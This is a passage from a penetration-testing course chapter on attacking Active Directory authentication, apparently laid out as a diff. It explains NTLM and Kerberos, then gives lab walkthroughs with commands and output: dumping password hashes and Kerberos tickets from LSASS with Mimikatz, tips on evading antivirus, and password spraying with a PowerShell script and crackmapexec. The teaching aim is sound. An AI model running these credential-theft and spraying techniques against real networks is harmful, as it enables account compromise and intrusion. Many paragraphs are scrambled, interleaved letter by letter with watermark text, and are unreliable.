@@ -1,0 +1,1643 @@
+                                                                                                                                                                       Penetration Testing with Kali Linux
+
+23 Attacking Active Directory Authentication
+
+In this Module, we will cover the following Learning Units:
+� Understanding Active Directory Authentication
+� Performing Attacks on Active Directory Authentication
+
+Having enumerated user accounts, group memberships, and registered Service Principal Names
+in the previous Module Active Directory Introduction and Enumeration, let's now attempt to use this
+information to compromise Active Directory.
+
+In this Module, we'll first explore authentication mechanisms of Active Directory (AD) and learn
+where Windows caches authentication objects such as password hashes and tickets. Next, we'll
+get familiar with the attack methods targeting these authentication mechanisms. We can use
+these techniques during different phases of a penetration test to obtain user credentials and
+access to systems and services. For this Module, we'll target the same domain (corp.com) as in
+the previous Module.
+
+23.1 Understanding Active Directory authentication
+
+This Learning Unit covers the following Learning Objectives:
+
+� Understand NTLM Authentication
+
+� Understand Kerberos Authentication
+a텮uctthiveeBnetDcicoiarmeticoetnofartyomWsiliuainprdpwooiwrtthssccamocmuhleptiduptlAeeDrsaCuartsehdweenJenteliltfciaafasrltseitoyhnoWshpeirtorlutoonwcnoinlsg
+                                                                                                                                                                and    techniques that  implement
+                                                                                                                                                                Linux  and macOS.
+
+Auosnceltyifvufeol fDcouirrseocoltdnoermryoosprueeprmpaotoirndtgserssOnyeSsva-te5ue7rtmah7l5eso2n1lltdi9kice0earWtpiorionntdopocrwootslosc7inooclsrluWindiitnnhdgisoWwLDesaigSrenesrinvt.geWrU2hn0iilt0e.8thRe2s,ewme awyilbl e
+
+In this Learning Unit, we'll discuss the details of NTLM and Kerberos authentication. In addition,
+
+we'll explore where and how AD credentials are cached on Windows systems.
+
+23.1.1 NTLM authentication
+
+In Password Attacks, we briefly discussed what NTLM is and where to find its hashes. In this
+section, we'll explore NTLM authentication in the context of Active Directory.
+
+NTLM authentication is used when a client authenticates to a server by IP address (instead of by
+hostname), or if the user attempts to authenticate to a hostname that is not registered on the
+Active Directory-integrated DNS server. Likewise, third-party applications may choose to use
+NTLM authentication instead of Kerberos.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                         791
+                                                                          Penetration Testing with Kali Linux
+
+The NTLM authentication protocol consists of seven steps:
+
+rhuInaasnestdhrh'oes, mnfpoirawvssatsklsuwnteoeowpcrd,an.tllhaeNesdeacxthtor,emeFtsihgnppueouornetcnec2lsire9ee7cn,o:aatDrlniccacdguohrlmasaameltlpeenounsdftgseNaerJTi.tceLsTtfMroeyfhnparetudethotycsehgleisWternhaehtnieipcrtvathtuetliihocrose.nwenhirnnaeAsanchmtci,vreceyapDtlotilrseetcdththoetrehyseneoNrnvTecLreM, uwshhianicsghht,hrfeertouNmrnTsLthMae
+cteTNhoqhTenueLtasMrulso, eptlhlhrpevaerlies.earhTduhfotuoehfsreewavnralaltnliriucaddsamasettieriootsnhan.enTriedshrqeectuhsoedpemOsonoStmpn-ipas5saer7eisern7fus5oacc2irltco1om9entno0setgrsdtofhwlubleelyi.trrhetehsntephcoedrnyopsumtessaeittirnhnreeaccmonenoievtnercoadelnlfedrirtos, mteshliefnthcwneeiotsihntecatrhevlreeetraNo. dITfytLthhkMeneohdtwwaossomhatahorineef
+
+As with any other cryptographic hash, NTLM cannot be reversed. However, it is considered a fast-
+hashing algorithm since short passwords can be cracked quickly using modest equipment.
+
+By using cracking software like Hashcat with top-of-the-line graphic processors, it is
+possible to test over 600 billion NTLM hashes every second. This means that eight-
+character passwords may be cracked within 2.5 hours and nine-character passwords
+may be cracked within 11 days.
+
+However, even with its relative weaknesses, completely disabling and blocking NTLM
+authentication requires extensive planning and preparation as it's an important fallback
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                792
+                                                                                                                              Penetration Testing with Kali Linux
+
+mechanism and used by many third-party applications. Therefore, we'll encounter enabled NTLM
+authentication in most assessments.
+
+Now that we've briefly covered NTLM authentication, in the next section we'll begin exploring
+Kerberos. Kerberos is the default authentication protocol in Active Directory and for associated
+services.
+
+23.1.2 Kerberos authentication
+
+The Kerberos authentication protocol used by Microsoft is adopted from Kerberos version 5
+created by MIT. Kerberos has been used as Microsoft's primary authentication mechanism since
+Windows Server 2003. While NTLM authentication works via a challenge-and-response paradigm,
+Windows-based Kerberos authentication uses a ticket system.
+
+A key difference between these two protocols (based on the underlying systems) is that with
+NTLM authentication, the client starts the authentication process with the application server
+itself, as discussed in the previous section. On the other hand, Kerberos client authentication
+involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client
+starts the authentication process with the KDC and not the application server. A KDC service runs
+on each domain controller and is responsible for session tickets and temporary session keys to
+users and computers.
+
+The client authentication process at a high level is shown in Figure 298.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  793
+                                                                          Penetration Testing with Kali Linux
+
+                                                              Whitlow
+LSaenelestcro'vsreyrmrpetRvaeeiidenqwtuuaseitnishnstigs(AtaphSrheo-aRcAsEehusQtsd)heiiensrnivsdteieecdFntaOaitgftSiriutlo-o.ro5enmF7t2ih7r9Sts5e8het2:e,drD1wv9opiae0hamgrseraJasnsmeiwenfarofovcfurrioKdcesneyeeort.rbrfeolTtorhlohlgeseesrAu.uiAsTntheShteroe-nRatdtinEchoadQetmiiotrhcnaweoinionr rtcuakossinnetstarrntoiaaollmnet,rie,ma.anecstAitnuagtmhaepsntatihcKaattDioCins,
+When the domain controller receives the request, it looks up the password hash associated with
+the specific user in the ntds.dit file and attempts to decrypt the timestamp. If the decryption
+process is successful and the timestamp is not a duplicate, the authentication is considered
+successful.
+
+     If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.
+
+Next, the domain controller replies to the client with an Authentication Server Reply (AS-REP).
+Since Kerberos is a stateless protocol, the AS-REP contains a session key and a Ticket Granting
+Ticket (TGT). The session key is encrypted using the user's password hash and may be decrypted
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  794
+                                                                                                                                                                                 Penetration Testing with Kali Linux
+
+by the client and then reused. The TGT contains information regarding the user, the domain, a
+timestamp, the IP address of the client, and the session key.
+
+To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the krbtgt account)
+known only to the KDC and cannot be decrypted by the client. Once the client has received the
+session key and the TGT, the KDC considers the client authentication complete. By default, the
+TGT will be valid for ten hours, after which a renewal occurs. This renewal does not require the
+user to re-enter their password.
+
+When the user wishes to access resources of the domain, such as a network share or a mailbox,
+it must again contact the KDC.
+
+This time, the client constructs a Ticket Granting Service Request (TGS-REQ) packet that consists
+of the current user and a timestamp encrypted with the session key, the name of the resource,
+and the encrypted TGT.
+
+Next, the ticket-granting service on the KDC receives the TGS-REQ, and if the resource exists in
+the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is
+then extracted from the TGT and used to decrypt the username and timestamp of the request. At
+this point the KDC performs several checks:
+
+1. The TGT must have a valid timestamp.
+
+2. The username from the TGS-REQ has to match the username from the TGT.
+
+3. The client IP address needs to coincide with the TGT IP address.
+
+T1If.ictkheisTt hGverearnnifatimicnagetiSooenfrtvhpeerrosRceeerpsvlsiyce(sTufGocrScew-RehEdiPcsh,).taThchecisetispcskaechtka-egstrbaWcenhoeitnintntlaggoirnwassentrthveridce.ee  responds  to  the  client  with      a
+                                                                                                                                                                                 parts:
+
+2.  A  sseersvsicioentikcekyettocobnetauisneindgbtehtewueesenrtnhaemcJeleiefanfnrtdeaygnrdotuhpemseermvibceer. ships                                                             along     with  the  newly
+3.  A
+
+aoTsfhstehoescceirsaerevtaeritcvdeeicdwetsiictaehkcsectshtoi'oesunncstkreeerraevytgi.cioiesntenoraefOmdSth-ewe5a7iTt7nhG5d2tTh1s.e9eT0sshseeirovsniceerkveiincyeqautrieecskeetintocnisr.yepntecdryupsteindgutshinegotrhigeinpaalsssewsosridonhaksehy
+
+Once the authentication process by the KDC is complete and the client has both a session key
+and a service ticket, the service authentication begins.
+
+First, the client sends the application server an Application Request (AP-REQ), which includes the
+username, and a timestamp encrypted with the session key associated with the service ticket
+along with the service ticket itself.
+
+The application server decrypts the service ticket using the service account password hash and
+extracts the username and the session key. It then uses the latter to decrypt the username from
+the AP-REQ. If the AP-REQ username matches the one decrypted from the service ticket, the
+request is accepted. Before access is granted, the service inspects the supplied group
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                     795
+                                                                                 Penetration Testing with Kali Linux
+
+memberships in the service ticket and assigns appropriate permissions to the user, after which
+the user may access the requested service.
+
+This protocol may seem complicated and perhaps even convoluted, but it was designed to
+mitigate various network attacks and prevent the use of fake credentials.
+
+Now that we have discussed the foundations of both NTLM and Kerberos authentication, let's
+explore various cached credential storage and service account attacks.
+
+23.1.3 Cached AD credentials
+
+To lay the foundation for cached storage credential attacks and lateral movement vectors in the
+Module Lateral Movement in Active Directory, we must first discuss the various password hashes
+used with Kerberos and show how they are stored.
+
+We already covered some of the following information in the Password Attacks Module. In this
+section, we'll focus on cached credentials and tickets in the context of AD.
+
+Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes
+must be stored somewhere to renew a TGT request.
+
+In modern versions of Windows, these hashes are stored in the Local Security Authority
+Subsystem Service (LSASS) memory space.
+
+ Info
+
+We can find an excellent reference guide here.
+
+If we  gain access to these hashes,  we  could  crack  thWehmitltoowobtain  the  cleartext  password  or  reuse
+them   to perform various actions.
+
+r(hBSAoeaielnttrschrclihaooeeeucvustesaghelhteianhotdLehfmSmissAtteihonSimisirsSse,ottdhprrwayerheotaoeacsonrre)ehdfstpesengesnooir.smtaThplopiasaouvmsrOfebtiSooalo-itncuk5ofsler7yt7shAtt5odhteDa2iogn1orcata9gput0isotenmaureJacareevkctnfeia,cnftntteegrhtsmadeessyc, yopkatsrornetowedtcthmirteeithcshakhseanyayi,dssltoahhrncrueeeoasntldsasaapltastsroasiovrsesiStledetrYranguoSicegcnTrhtyeEuatpsMfrttoecea,sradrwwlguaaeewstriteonid.tdnehaetsiaodnnisStotYLsordSeSreeeATmrSEthtMSsoe.-
+stored key.
+
+Nevertheless, since the extraction of cached credentials is a large attack vector against Windows
+and Active Directory, several tools have been created to extract the hashes. The most popular of
+these tools is Mimikatz.
+
+Let's try to use Mimikatz to extract domain hashes on our Windows 11 system.
+
+In the following example, we will run Mimikatz as a standalone application. However, due
+to the mainstream popularity of Mimikatz and well-known detection signatures, consider
+avoiding using it as a standalone application and use methods discussed in the Antivirus
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                  796
+                                                                                              Penetration Testing with Kali Linux
+
+     Evasion Module instead. For example, execute Mimikatz directly from memory using an
+     injector like PowerShell, or use a built-in tool like Task Manager to dump the entire LSASS
+     process memory, move the dumped data to a helper machine, and then load the data
+     into Mimikatz.
+
+Since the jeff domain user is a local administrator on CLIENT75, we can launch a PowerShell
+prompt with elevated privileges. First, let's connect to this machine as jeff with the password
+HenchmanPutridBonbon11 over RDP.
+
+kali@kali:~$ <cu>xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11
+/v:192.168.50.75</cu>
+
+                           Listing 844 - Connecting to CLIENT75 via RDP
+
+Once connected, we start a PowerShell session as Administrator. From this command prompt,
+we can start Mimikatz and enter privilege::debug to engage the SeDebugPrivlege privilege, which
+will allow us to interact with a process owned by another account.
+
+PS C:\Windows\system32> <cu>cd C:\Tools</cu>
+
+PS C:\Tools\> <cu>.\mimikatz.exe</cu>
+...
+
+mimikatz # <cu>privilege::debug</cu>
+Privilege '20' OK
+
+                                      Listing 845 - Starting Mimikatz and enabling SeDebugPrivilege
+
+Now we can run sekurlsa::logonpasswords  to  dumWphithtleowcredentials                        of  all  logged-on  users  with
+the Sekurlsa module.
+
+rmTeihmmisiokstaehtolzougl#idns<dculiukm>espRekheumarsolhsteeas:D:feolsorkgatoollnppuassseessrswsoilorondgssgJ<.ee/fdcfuro>eny to the current workstation or server, including
+
+Authentication  Id  :  jC0ReeOfR;mPoft48eI76nO8tS3e-8r5a77(c50t20i10v90e000fr0o0m:0204a6a26)
+Session             :
+User Name           :
+Domain              :
+
+Logon Server        : DC1
+
+Logon Time          : 9/9/2022 12:32:11 PM
+
+SID                 : S-1-5-21-1987370270-658905905-1781884369-1105
+
+     msv :
+
+     [00000003] Primary
+
+     * Username : jeff
+
+     * Domain : CORP
+
+     * NTLM            : <cr>2688c6d2af5e9c7ddb268899123744ea</cr>
+
+     * SHA1            : <cr>f57d987a25f39a2887d158e8d5ac41bc8971352f</cr>
+
+     * DPAPI : 3a847021d5488a148c265e6d27a420e6
+
+     tspkg :
+
+     wdigest :
+
+     * Username : jeff
+
+     * Domain : CORP
+
+     * Password : (null)
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                 797
+                                                                          Penetration Testing with Kali Linux
+
+         kerberos :
+
+         * Username : jeff
+
+         * Domain : CORP.COM
+
+         * Password : (null)
+
+         ssp :
+
+         credman :
+
+         cloudap :
+
+...
+
+Authentication Id : 0 ; 122474 (00000000:0001de6a)
+
+Session                  : Service from 0
+
+User Name                : dave
+
+Domain                   : CORP
+
+Logon Server             : DC1
+
+Logon Time               : 9/9/2022 1:32:23 AM
+
+SID                      : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         msv :
+
+         [00000003] Primary
+
+         * Username : dave
+
+         * Domain : CORP
+
+         * NTLM          : <cr>08d7a47a6f9f66b97b1bae4178747494</cr>
+
+         * SHA1          : <cr>a0c2285bfad20cc614e2d361d6246579843557cd</cr>
+
+         * DPAPI : fed8536adc54ad3d6d9076cbc6dd171d
+
+         tspkg :
+
+         wdigest :
+
+         * Username : dave
+
+         * Domain : CORP
+
+         * Password : (null)
+
+         kerberos :
+
+         * Username : dave
+
+          * Domain : CORP.COM                   Whitlow
+          * Password : (null)
+         ssp :
+         credman :
+
+              cloudap :  Listing 846 - ExecutingJMefimfrikeaytz on a domain workstation
+...
+
+TdahveeoA, iunntceplfuuftdeciantbgivoecvaedceshfheeondwshisvaesahltleeccsrh.eOndSi-eq5nu7te7ia5tl2oi1np9f0roervmenattiotonoslstosruecdhinasLSMAimSSikfaotzr  the domain users  jeff  and
+                                                                                                                                                             from extracting
+
+     hashes is to enable additional LSA Protection. The LSA includes the LSASS process. By
+
+     setting a registry key, Windows prevents reading memory from this process. We'll
+
+     discuss how to bypass this and other powerful defensive mechanisms in-depth in
+
+     OffSec's Evasion Techniques and Breaching Defenses course, PEN-300.
+
+We can observe two types of hashes highlighted in the output above. This will vary based on the
+functional level of the AD implementation. For AD instances at a functional level of Windows
+2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008
+or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On
+older operating systems like Windows 7, or operating systems that have it manually set, WDigest
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                             798
+                                                                                                 Penetration Testing with Kali Linux
+
+will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext passwords
+alongside the password hashes.
+
+Armed with these hashes, we could attempt to crack them and obtain the cleartext password as
+we did in Password Attacks.
+
+A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT
+and service tickets. As already discussed, we know that Kerberos TGT and service tickets for
+users currently logged on to the local machine are stored for future use. These tickets are also
+stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as
+the tickets of other local users.
+
+Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with
+UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
+
+PS C:\Users\jeff> <cu>dir \\web04.corp.com\backup</cu>
+
+Directory: \\web04.corp.com\backup
+
+Mode                      LastWriteTime          Length Name
+----                      -------------          ------ ----
+-a----          9/13/2022 2:52 AM
+                                                          0 backup_schemata.txt
+
+                           Listing 847 - Displaying contents of a SMB share
+
+Once we've    executed the directory listing on  stehkeuSrlMsWahB:i:ttisclhokawertes,.  we  can  use      Mimikatz  to  show  the
+tickets that  are stored in memory by entering
+
+mimikatz #     <cu>sekurlsa::tickets</cu>
+
+Authentication  Id  :  Rj0eefm;fo6t5eI65n8t8er(a0ct00iv00e0f0J0re:of0mf0r02eay04cc)
+Session             :
+User Name           :  9DCS-CO/1R11P3-/52-0221O2-S1-295:877475332:713091207A0M-658905905-1781884369-1105
+
+Domain              :
+Logon Server        :
+Logon Time          :
+SID                 :
+
+        * Username : jeff
+
+        * Domain : CORP.COM
+
+        * Password : (null)
+
+        <cg>Group 0</cg> - <cr>Ticket Granting Service</cr>
+
+        [00000000]
+
+              Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ;
+
+9/20/2022 2:43:56 AM
+
+              Service Name (02) : <cr>cifs ; web04.corp.com ; @ CORP.COM</cr>
+
+              Target Name (02) : cifs ; web04.corp.com ; @ CORP.COM
+
+              Client Name (01) : <cr>jeff ; @ CORP.COM</cr>
+
+              Flags 40a10000 : name_canonicalize ; pre_authent ; renewable ;
+
+forwardable ;
+
+              Session Key    : 0x00000001 - des_cbc_crc
+
+              38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                      799
+                                                                          Penetration Testing with Kali Linux
+
+     Ticket                : 0x00000012 - aes256_hmac                     ; kvno = 3  [...]
+
+     [00000001]
+
+     Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ;
+
+9/20/2022 2:43:56 AM
+
+     Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
+
+     Target Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
+
+     Client Name (01) : jeff ; @ CORP.COM ( CORP.COM )
+
+     Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ;
+
+renewable ; forwardable ;
+
+     Session Key           : 0x00000001 - des_cbc_crc
+
+     c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
+
+     Ticket                : 0x00000012 - aes256_hmac                     ; kvno = 3  [...]
+
+     Group 1 - Client Ticket ?
+
+     <cg>Group 2</cg> - <cr>Ticket Granting Ticket</cr>
+
+     [00000000]
+
+     Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ;
+
+9/20/2022 2:43:56 AM
+
+     Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+
+     Target Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+
+     Client Name (01) : jeff ; @ CORP.COM ( CORP.COM )
+
+     Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ;
+
+forwardable ;
+
+     Session Key           : 0x00000001 - des_cbc_crc
+
+     bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
+
+     Ticket                : 0x00000012 - aes256_hmac                     ; kvno = 2  [...]
+
+...
+
+                      Listing 848 - Extracting Kerberos tickets with mimikatz
+
+eMsfrKT(BAoetxheeosirDpmyfeololesoIouiCrnnpkreruSfeaecortct)ceaplrzaoissutfftovitcotecarearusrsirg.mnrchisenetoopasudgwcollresteaisuaimoctrt(tbkcePaeeoeedKcnxttskptsIhw)soawlaiiartnothetPTneAttGKriwhcDAITio,knaD. esnwaOMtteathSnhsi-uidctits5citotrcoha7hoak7etnsTet5aenohdtG2rxtsefg1ictStc.9hehh.aAp0etaSatrltionnwrJtoedegveenriatfienxddhflmtsaierirnnMtiseveidgvyecoittegahhhdlaWiyeeatTuhna,nlGiAdaedlitsSr.Doclmimmmeowrrwesoptaodi,lfoiuenliewrcl.tdAtai'WtstctahietclebislvkaoreewiwbTetDesfGiulltliywTrisned,eettciwxoosetpocneaLlruocyScasrcoAueCseutSeshthlSrhdsetoe,inrfowweitucniqhcasltyuaioteceetpheoslaSedtfrwevtaPeruiecvurTsiuacwbeGlgelariiSeslcsrl
+and trusted resources.
+
+If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates
+(and much more). While a deep discussion on these concepts would require its own Module, let's
+focus on one aspect of cached and stored objects related to AD CS.
+
+For example, we could issue certificates for web servers to use HTTPS or to authenticate users
+based on certificates from the CA via Smart Cards.
+
+These certificates may be marked as having a non-exportable private key for security reasons. If
+so, a private key associated with a certificate cannot be exported even with administrative
+privileges. However, there are various methods to export the certificate with the private key.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.              800
+                                                                          Penetration Testing with Kali Linux
+
+We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to
+either patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng, making
+non-exportable keys exportable.
+
+As we've now covered in this section and in Password Attacks, Mimikatz can extract information
+related to authentication performed through most protocols and mechanisms, making this tool a
+real Swiss Army knife for cached credentials!
+
+23.2 Performing attacks on Active Directory authentication
+
+This Learning Unit covers the following Learning Objectives:
+� Use password attacks to obtain valid user credentials
+� Abuse enabled user account options
+� Abuse the Kerberos SPN authentication mechanism
+� Forge service tickets
+� Impersonate a domain controller to retrieve any domain user credentials
+
+In the previous Learning Unit, we discussed NTLM and Kerberos authentication, as well as where
+
+we can find cached AD credentials and objects. In this Learning Unit, we'll explore various attacks
+
+in the context of these authentication mechanisms. The attack techniques are introduced
+
+independently from each other as they can be used in several different phases of a penetration
+
+test. For a majority of attacks, we'll also discuss ways of performing them from Windows and
+
+Linux alike, making us more flexible and able to adapt to a variety of real-world assessment
+                                   Whitlow
+scenarios.  Password attacks
+                                   saelsvoeraaJlevpfiaafrsbesleywochrdoiactetaicnksthoencnoenttwexotrkosf eArvDicetos
+23.2.1
+
+In a previous Module, we examined                                                                                      and hashed
+information. Password attacks are                                                                                      obtain user
+
+pBlcoreecerfkdfoooerruenmttsieia.nxlgsTp.looIaonrintmbhgriaustntsheyeecsffaoteiirolceanedt, twaloocergk'lOilswnSe,s-oxw5rpm7del7olai5srny2et1evb9eaal0duoritcohtkouesnthatAieccDcaaotpciuoacnnsotsuwafnottotrarfdcookran,teftuwaricmethkpesm.rouratsatttnatcbkecsoanawsniaddreepraootsifosinba.lcyWcoahuleenrntt
+
+system administrators.
+
+To learn more about account lockouts, let's review the domain's account policy as domain user
+jeff on CLIENT75. We can connect to the system with the password HenchmanPutridBonbon11
+via RDP. Next, we'll open a regular PowerShell window and execute net accounts to obtain the
+account policy.
+
+PS C:\Users\jeff> <cu>net accounts</cu>                                   Never
+Force user logoff how long after time expires?:                           1
+Minimum password age (days):                                              42
+Maximum password age (days):                                              7
+Minimum password length:                                                  24
+Length of password history maintained:
+<cr>Lockout threshold:                                                           5</cr>
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                               801
+                                                                          Penetration Testing with Kali Linux
+
+<cr>Lockout duration (minutes):                                           30</cr>
+
+<cr>Lockout observation window (minutes):                                 30</cr>
+
+Computer role:                                                            WORKSTATION
+
+The command completed successfully.
+
+                Listing 849 - Results of the net accounts command
+
+There's a lot of great information available, but let's first focus on Lockout threshold, which
+indicates a limit of five login attempts before lockout. This means we can safely attempt four
+logins before triggering a lockout. Although this may not seem like many, we should also consider
+the Lockout observation window, which indicates that thirty minutes after the last failed login, we
+can make additional attempts.
+
+With these settings, we could attempt 192 logins in a 24-hour period against every domain user
+without triggering a lockout, assuming the actual users don't fail a login attempt.
+
+An attack like this might consist of compiling a short list of very common passwords and
+leveraging it against a massive number of users. Sometimes this type of attack can reveal quite a
+few weak account passwords in the organization.
+
+However, this would also generate a huge amount of network traffic. Let's review three kinds of
+password spraying attacks that have a higher chance of success in an AD environment.
+
+The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow
+
+password attack against AD users. In the Module Active Directory Introduction and Enumeration,
+
+we performed queries against the domain controller as a logged-in user with DirectoryEntry.
+
+However, we can also make queries in the context of a different user by setting the DirectoryEntry
+
+PtiIcnnhSosentCtadsh:tnoe\rcmuUecsMa.teoinrorsdcw\uojlinetehtfrofoAu>lcltet<iarvc,retugh>ueD$mduiroesemnecatrtsion,nraybOmbujeItn,wt=areonddcuatchntJeiopepfnroafrsvaeisdnywedoWthrhEdirnt:elueomwaergrautmionen, tsw,einculuseddingththee  DirectoryEntry
+                                                                                                                                                                                                                                            LDAP path to
+
+PP[SSSyCsCt::\\eUUmss.eeDrrissr\\ejjceetffoffr>>yS<<eccruuv>>i$$cSPeeDsCa.rAc=cOhtS(Si-$tv5dre77oiD5nmi2agr1ie9=nc0Ot"boLjr.DyPA.dPD:co/Rm/oal"ie<nO/]wc:un:e>Gre)t.CNuarmree<n/tcDuo>main()</cu>
+
+PS C:\Users\jeff> <cu>$SearchString += $PDC + "/"</cu>
+
+PS C:\Users\jeff> <cu>$DistinguishedName = "DC=$($domainObj.Name.Replace('.',
+',DC='))"</cu>
+
+PS C:\Users\jeff> <cu>$SearchString += $DistinguishedName</cu>
+
+PS C:\Users\jeff> <cu>New-Object
+System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")</cu>
+
+                                               Listing 850 - Authenticating using DirectoryEntry
+
+If the password for the user account is correct, the object creation will be successful, as shown in
+Listing 851.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                    802
+                                                                          Penetration Testing with Kali Linux
+
+distinguishedName : {DC=corp,DC=com}
+
+Path               : LDAP://DC1.corp.com/DC=corp,DC=com
+
+                   Listing 851 - Successfully authenticated with DirectoryEntry
+
+If the password is invalid, no object will be created and we will receive an exception, as shown in
+Listing 852. To address this, let's change the password in the constructor to WrongPassword.
+We'll note the clear warning that the username or password is incorrect.
+
+format-default : The following exception occurred while retrieving member
+
+"distinguishedName": <cr>"The user name or
+
+password is incorrect.</cr>
+
+"
+
+   + CategoryInfo            : NotSpecified: (:) [format-default],
+
+ExtendedTypeSystemException
+
+   + FullyQualifiedErrorId :
+
+CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
+
+                   Listing 852 - Incorrect password used with DirectoryEntry
+
+We could use this technique to create a PowerShell script that enumerates all users and performs
+authentications according to the Lockout threshold and Lockout observation window.
+
+This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-
+Passwords.ps1 on CLIENT75.
+
+The -Pass option allows us to set a single password to test, or we can submit a wordlist file using
+-File. We can also test admin accounts by adding the -Admin flag. The PowerShell script
+automatically identifies domain users and sprays a password against them.
+
+PP.PWS.ASSR.CCCNI:::\\\NUTTGoso:eoollrasssl\>>sjo<e<ccftufua>>>r.pg\o<eScwtpeuir>rnacsgyhdea-lCdPl:mais\nT-seowaopoclrcsbdo<ysu/p.nacptusss>s1.<J/-ecPfuaf>srseyNeWxhiutsl1o2w3! -Admin</cu>
+G<PUG'ecusuererejsrfe>sssonsree''dgdmpueiwetnpipagtsaess'shssbewdwpwroaoiutrstrasrdhedwepffof:oooarrdrrscs:euwuso'sreeN-redrx:::pur'''seOjN1psSee2es-x3tn5u!e'[77''sq51<=]22/=1'3ct9r'!No0e'>Nexsxutsuo1sp1232t!3h'!e'process and print results...
+
+                                       Listing 853 - Using Spray-Passwords to attack user accounts
+
+Nice! The password spraying was successful, providing us two valid sets of credentials with the
+password Nexus123!.
+
+The second kind of password spraying attack against AD users leverages SMB. This is one of the
+traditional approaches of password attacks in AD and comes with some drawbacks. For
+example, for every authentication attempt, a full SMB connection must be set up and then
+terminated. As a result, this kind of password attack is very noisy due to the generated network
+traffic. It is also quite slow in comparison to other techniques.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.         803
+                                                                                          Penetration Testing with Kali Linux
+
+We can use crackmapexec on Kali to perform this kind of password spraying. We'll select smb as
+protocol and enter the IP address of any domain joined system such as CLIENT75
+(192.168.50.75). Then, we can provide a list or single users and passwords to -u and -p. In
+addition, we will enter the domain name for -d and provide the option --continue-on-success to
+avoid stopping at the first valid credential. For the purposes of this example, we'll create a text file
+named users.txt containing a subset of the domain usernames dave, jen, and pete to spray the
+password Nexus123! against.
+
+kali@kali:~$ <cu>cat users.txt</cu>
+dave
+jen
+pete
+
+kali@kali:~$ <cu>crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d
+
+corp.com --continue-on-success</cu>
+
+SMB  192.168.50.75 445 CLIENT75                                           [*] Windows 10.0 Build 22000 x64
+
+(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+
+SMB  192.168.50.75 445 CLIENT75                                           <cr>[-]</cr>
+
+corp.com\dave:Nexus123! STATUS_LOGON_FAILURE
+
+SMB  192.168.50.75 445 CLIENT75                                           <cr>[+]
+
+corp.com\jen:Nexus123!</cr>
+
+SMB  192.168.50.75 445 CLIENT75                                           <cr>[+]
+
+corp.com\pete:Nexus123!</cr>
+
+                   Listing 854 - Using crackmapexec to attack user accounts
+
+Listing 854 shows that crackmapexec identified the same two valid sets of credentials as Spray-
+
+Passwords.ps1 did previously. By prepending the attempted credentials with a plus or minus,
+
+crackmapexec indicates whether or not each is valid.
+
+Wstaertsinhgoutldhenoptaestshwaot rcdrascpkrmayainpgex. eAcsdaoersens'tulet,xawmeinWsehhiotthulelodwpabseswcaourdtiopuoslicayboofutthleocdkoinmgaionubt eufoserer
+
+accounts with this method.       of  crackmJaefpferxeeyc  not             only  displays  if  credentials  are  valid,     but
+As a bonus, however, the output
+
+akFFSMallosolBrowie@eifxkrsaath1mleitp:aul~resg$,ee1dr9<taic2wnvu.gie>1tht6chi8rstia.hsa5cemk0lim.odaa7cec5panheltixnifaeOeiedc4S. d4m-5s5cim7nr7be5od21ne1C9n9L2C0tI.iLaE1Il6NEs8TN.7hT55a07s.5a7. 5dLme-tiun'sisdu[atrs*vae]etivcW-eripanpcd'rkoFivmwlilsoeawgp1eee0rsx.se01oc'nBwu-thiditelhdctotah2rre2pg0.ep0cta0osmsyx<ss6/wt4ceoumr>d.
+
